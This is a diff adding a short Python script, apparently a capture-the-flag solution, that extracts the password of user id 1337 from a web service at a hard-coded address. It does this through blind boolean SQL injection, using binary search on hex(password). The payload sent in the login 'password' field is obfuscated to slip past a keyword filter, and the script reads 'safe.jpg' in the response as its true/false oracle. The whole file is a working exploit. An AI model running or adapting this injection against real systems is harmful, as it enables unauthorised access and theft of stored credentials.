@@ -1,0 +1,31 @@
+import requests
+from Crypto.Util.number import bytes_to_long as b2l, long_to_bytes as l2b
+from tqdm import tqdm
+from time import perf_counter
+
+session = requests.Session()
+url = 'http://103.245.250.17:30007/'
+
+length = 60
+l = b2l(b'\x00' * length) # = 0
+r = b2l(b'\xff' * length)
+
+bar = tqdm(total=r.bit_length()) # O(logn) lol
+t1_start = perf_counter()
+
+while l < r:
+  m = (l + r) // 2
+  sent = hex(m).upper()[2:]
+
+  bar.set_description(f"Testing: {l2b(m)}")
+  payload = f"' OUNIONR (id = 1337 AND hex(password) > '{sent}') -UNION- -"
+  res = session.post(url, {"password": payload})
+  if 'safe.jpg' in res.text:
+    r = m - 1
+  else:
+    l = m + 1
+  bar.update(1)
+
+t1_stop = perf_counter()
+bar.close()
+print("Elapsed time:", t1_stop - t1_start)
